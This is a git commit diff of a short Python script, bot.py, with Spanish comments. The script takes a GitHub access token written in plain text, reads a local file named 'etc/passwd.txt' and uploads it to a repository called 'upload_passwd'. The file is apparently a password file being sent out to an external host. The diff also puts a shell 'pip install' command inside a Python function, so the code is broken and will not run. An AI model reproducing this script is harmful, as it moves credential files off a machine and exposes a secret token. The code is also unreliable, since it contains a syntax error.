b81cffd09eeea7006017855b7a5d90335776d343
Oxitocinaa <144260303+Oxitocinaa@users.noreply.github.com>
2023-09-07 16:05:19 +0200

    bot.py

--- bot.py
+++ bot.py
@@ -1,26 +1,25 @@
 def run():
+  pip install PyGithub
   from github import Github
-import os
+  import os
 
-token = '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'
-usuario = 'Oxitocinaa'
-repositorio = 'upload_passwd'
+  token = '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'
+  usuario = 'Oxitocinaa'
+  repositorio = 'upload_passwd'
 
-# Ruta local del archivo que deseas subir
-archivo_local = 'etc/passwd.txt'
+  archivo_local = 'etc/passwd.txt'
 
-# Rama en la que deseas realizar la carga
-rama = 'main'
+  rama = 'main'
 
-# Crea una instancia de la clase Github con tu token
-g = Github(token)
+  # Crea una instancia de la clase Github con tu token
+  g = Github(token)
 
-# Obtiene el repositorio
-repo = g.get_user(usuario).get_repo(repositorio)
+  # Obtiene el repositorio
+  repo = g.get_user(usuario).get_repo(repositorio)
 
-# Sube el archivo al repositorio
-with open(archivo_local, 'rb') as archivo:
+  # Sube el archivo al repositorio
+  with open(archivo_local, 'rb') as archivo:
     contenido = archivo.read()
     repo.create_file(archivo_local, f"Commit desde script", contenido, branch=rama)
 
-print(f"Archivo '{archivo_local}' subido exitosamente a la rama '{rama}' en el repositorio '{repositorio}'.")
+  print(f"Archivo '{archivo_local}' subido exitosamente a la rama '{rama}' en el repositorio '{repositorio}'.")
